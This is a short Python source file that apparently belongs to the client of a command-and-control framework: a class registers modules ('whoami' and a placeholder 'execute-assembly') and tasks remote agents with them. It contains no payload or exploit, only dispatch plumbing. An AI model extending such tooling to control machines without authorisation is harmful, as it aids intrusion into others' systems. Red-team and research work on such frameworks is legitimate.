from libs.client.modules.whoami import *


class ModuleHolder:

    def __init__(self):
        self.modules = {
            "execute-assembly":"",
            "whoami":Whoami
        }

    
    def is_module_installed(self,module_name):
        return module_name in self.modules.keys()
    
    def execute_module(self,tsobj, module_name, entire_splitted_command,agent):
        module = self.modules[module_name](tsobj,entire_splitted_command,agent)
        try:
            module.run()
            print("\033[92m\n[+] Tasked agent\n\033[0m")
        except:
            return "[Error] Module Failed"
        return "[Success] Module successfully sent"